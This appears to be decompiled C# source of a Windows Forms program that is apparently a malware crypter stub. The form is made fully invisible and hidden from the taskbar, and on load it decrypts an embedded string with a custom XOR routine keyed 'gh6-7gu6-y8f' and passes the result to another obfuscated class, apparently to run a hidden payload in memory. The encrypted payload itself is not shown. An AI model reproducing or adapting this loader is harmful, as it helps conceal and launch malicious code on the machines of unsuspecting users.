using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using ns1;

namespace ns2;

internal class Form1 : Form
{
	private IContainer icontainer_0;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(284, 262);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		byte[] byte_ = method_0(Encoding.Default.GetBytes(Class6.smethod_1()));
		Class5.smethod_0(byte_, "A", "A", new object[0]);
	}

	public byte[] method_0(byte[] byte_0)
	{
		byte[] bytes = Encoding.Default.GetBytes("gh6-7gu6-y8f");
		for (int i = byte_0.Length * 2 + bytes.Length; i >= 0; i += -1)
		{
			byte_0[i % byte_0.Length] = (byte)(((byte_0[i % byte_0.Length] ^ bytes[i % bytes.Length]) - byte_0[(i + 1) % byte_0.Length] + 256) % 256);
		}
		return byte_0;
	}
}
